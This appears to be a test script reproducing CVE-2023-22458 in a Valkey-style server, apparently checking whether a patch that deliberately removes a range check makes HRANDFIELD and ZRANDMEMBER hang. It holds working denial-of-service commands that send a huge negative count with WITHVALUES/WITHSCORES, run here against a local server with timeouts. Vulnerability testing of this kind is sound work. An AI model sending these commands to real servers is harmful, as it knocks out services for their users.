#!/bin/bash
# Reproducer for the missing range check in HRANDFIELD/ZRANDMEMBER
# (upstream fix commit 16f408b1a0121cacd44cbf8aee275d69dc627f02,
#  CVE-2023-22458).
#
# With the check removed (injection.patch), passing a huge negative
# "count" together with WITHVALUES/WITHSCORES skips the "value is out
# of range" guard. The command then falls through with a count whose
# absolute value is astronomically large, and the (single-threaded)
# server tries to serve that many (repeated) random elements instead
# of replying with an error: it becomes unresponsive, including to
# every later command on every connection. On the clean build the
# out-of-range check rejects the command immediately and the server
# stays responsive. Every client call below is bounded with `timeout`
# so this script itself always finishes quickly either way.
set -u

LOG=s.log
CLI() { timeout 5 "$VALKEY_CLI" -p "$PORT" "$@"; }

"$VALKEY_SERVER" --port "$PORT" --save "" --appendonly no --dir . \
    --enable-debug-command yes --logfile "$LOG" &
SERVER_PID=$!

for i in $(seq 1 50); do
    CLI ping >/dev/null 2>&1 && break
    sleep 0.1
done

# All setup happens before we trigger the bug, since a hung server
# will not answer any command on any connection afterwards.
CLI hmset myhash a 1 >/dev/null
CLI zadd myzset 0 a >/dev/null

echo "HRANDFIELD:"
CLI hrandfield myhash -9223372036854770000 withvalues
[ $? -eq 124 ] && echo "TIMEOUT"

echo "ZRANDMEMBER:"
CLI zrandmember myzset -9223372036854770000 withscores
[ $? -eq 124 ] && echo "TIMEOUT"

# Check whether the server is still responsive.
if CLI ping >/dev/null 2>&1; then
    echo "SERVER_ALIVE"
    CLI shutdown nosave >/dev/null 2>&1
else
    echo "SERVER_DOWN"
fi

# Make sure nothing is left running, regardless of how it got here.
kill -9 "$SERVER_PID" >/dev/null 2>&1
wait "$SERVER_PID" 2>/dev/null

if grep -q "ASSERTION FAILED" "$LOG" 2>/dev/null; then
    echo ASSERTION
fi
if grep -qi "segmentation fault\|SIGSEGV\|crashed by signal" "$LOG" 2>/dev/null; then
    echo CRASHED
fi
